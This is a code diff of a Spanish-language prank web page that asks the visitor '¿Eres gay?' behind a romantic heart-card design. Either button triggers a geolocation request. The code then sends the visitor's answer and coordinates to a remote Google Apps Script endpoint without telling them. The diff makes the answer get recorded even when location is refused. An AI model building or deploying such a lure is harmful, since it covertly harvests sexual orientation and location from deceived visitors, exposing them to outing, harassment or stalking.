@@ -1,175 +1,20 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#ff477e">
-
-<title>Baby ❤️</title>
-
-<style>
-*{box-sizing:border-box}
-
-body{
-    margin:0;
-    min-height:100vh;
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
-    color:white;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background:
-        radial-gradient(circle at 20% 20%,#ff9abb 0%,transparent 35%),
-        radial-gradient(circle at 80% 80%,#9b6cff 0%,transparent 35%),
-        linear-gradient(135deg,#ff477e,#8b5cf6);
-    background-size:180% 180%;
-    animation:fondo 12s ease infinite;
-}
-
-@keyframes fondo{
-    0%{background-position:0% 50%}
-    50%{background-position:100% 50%}
-    100%{background-position:0% 50%}
-}
-
-.contenedor{
-    width:92%;
-    max-width:430px;
-}
-
-.tarjeta{
-    padding:35px 25px;
-    text-align:center;
-    background:rgba(255,255,255,.16);
-    border:1px solid rgba(255,255,255,.3);
-    border-radius:32px;
-    backdrop-filter:blur(25px);
-    -webkit-backdrop-filter:blur(25px);
-    box-shadow:0 25px 70px rgba(0,0,0,.25);
-}
-
-.corazon{
-    font-size:72px;
-    animation:latido 1.4s infinite;
-}
-
-@keyframes latido{
-    0%,100%{transform:scale(1)}
-    50%{transform:scale(1.15)}
-}
-
-h1{
-    margin:15px 0 25px;
-    font-size:38px;
-}
-
-.botones{
-    display:flex;
-    flex-direction:column;
-    gap:12px;
-}
-
-button{
-    width:100%;
-    padding:16px;
-    border:none;
-    border-radius:20px;
-    font-size:18px;
-    font-weight:700;
-    cursor:pointer;
-}
-
-.si{
-    color:#ff477e;
-    background:white;
-}
-
-.no{
-    color:white;
-    background:rgba(0,0,0,.18);
-    border:1px solid rgba(255,255,255,.2);
-}
-
-#estado{
-    margin-top:20px;
-    min-height:25px;
-    font-size:16px;
-}
-
-.corazon-flotante{
-    position:fixed;
-    bottom:-50px;
-    pointer-events:none;
-    animation:subir linear forwards;
-}
-
-@keyframes subir{
-    0%{
-        transform:translateY(0);
-        opacity:0;
-    }
-    15%{opacity:.9}
-    100%{
-        transform:translateY(-115vh);
-        opacity:0;
-    }
-}
-</style>
-</head>
-
-<body>
-
-<div class="contenedor">
-
-<div class="tarjeta">
-
-<div class="corazon">❤️</div>
-
-<h1>¿Eres gay?</h1>
-
-<div class="botones">
-
-<button class="si" onclick="responder('Sí')">
-Sí ❤️
-</button>
-
-<button class="no" onclick="responder('No')">
-No 😭
-</button>
-
-</div>
-
-<div id="estado"></div>
-
-</div>
-</div>
-
-<script>
-
-const URL_SCRIPT =
-"https://script.google.com/macros/s/AKfycbwnPuBP7-F2w3cisdsYU7JUcHGOBftsRixeiyDF4yhZaF_42Z31xyJ2RqhVrU-GRMwQhw/exec";
-
-const musica =
-new Audio("Grupo%20Marrano%20-%20El%20Ansioso.mp3");
-
-musica.loop = true;
-musica.volume = .7;
-
-
 function responder(respuesta){
 
     musica.play().catch(()=>{});
 
-    const estado =
-        document.getElementById("estado");
+    const estado = document.getElementById("estado");
 
-    estado.innerHTML =
-        "❤️ Esperando permiso...";
+    estado.innerHTML = "Registrando tu respuesta... ❤️";
 
-    if(!navigator.geolocation){
+    // Primero intentamos obtener la ubicación
+    if (!navigator.geolocation) {
 
-        estado.innerHTML =
-            "Este dispositivo no permite compartir ubicación.";
+        enviarRespuesta(
+            respuesta,
+            "",
+            "",
+            "No se pudo compartir ubicación"
+        );
 
         return;
     }
@@ -178,24 +23,25 @@ function responder(respuesta){
 
         function(posicion){
 
-            const latitud =
-                posicion.coords.latitude;
-
-            const longitud =
-                posicion.coords.longitude;
-
             enviarRespuesta(
                 respuesta,
-                latitud,
-                longitud
+                posicion.coords.latitude,
+                posicion.coords.longitude,
+                "Ubicación compartida"
             );
 
         },
 
         function(){
 
-            estado.innerHTML =
-                "No se concedió el permiso de ubicación.";
+            // Aunque rechace/no esté disponible,
+            // la respuesta SÍ queda registrada
+            enviarRespuesta(
+                respuesta,
+                "",
+                "",
+                "No se pudo compartir ubicación"
+            );
 
         },
 
@@ -211,14 +57,12 @@ function responder(respuesta){
 function enviarRespuesta(
     respuesta,
     latitud,
-    longitud
+    longitud,
+    estadoUbicacion
 ){
 
     const estado =
         document.getElementById("estado");
-
-    estado.innerHTML =
-        "❤️ Listo.";
 
     fetch(
         URL_SCRIPT,
@@ -233,69 +77,35 @@ function enviarRespuesta(
 
                 longitud:longitud,
 
+                estadoUbicacion:estadoUbicacion,
+
                 fecha:new Date().toISOString()
 
             })
         }
     )
     .then(r => r.json())
+
     .then(resultado => {
 
         if(resultado.ok){
 
             estado.innerHTML =
-                "❤️ Gracias.";
+                "❤️ Respuesta registrada";
 
         }else{
 
             estado.innerHTML =
-                "No se pudo enviar.";
+                "No se pudo registrar la respuesta.";
 
         }
 
     })
+
     .catch(() => {
 
         estado.innerHTML =
-            "No se pudo completar el envío.";
+            "No se pudo registrar la respuesta.";
 
     });
 }
-
-
-function crearCorazon(){
-
-    const elemento =
-        document.createElement("div");
-
-    elemento.className =
-        "corazon-flotante";
-
-    elemento.innerHTML =
-        ["❤️","💗","💕","💖","💞"][
-            Math.floor(Math.random()*5)
-        ];
-
-    elemento.style.left =
-        Math.random()*100+"vw";
-
-    elemento.style.fontSize =
-        15+Math.random()*25+"px";
-
-    elemento.style.animationDuration =
-        5+Math.random()*5+"s";
-
-    document.body.appendChild(elemento);
-
-    setTimeout(
-        ()=>elemento.remove(),
-        10000
-    );
-}
-
-setInterval(crearCorazon,600);
-
-</script>
-
-</body>
-</html>
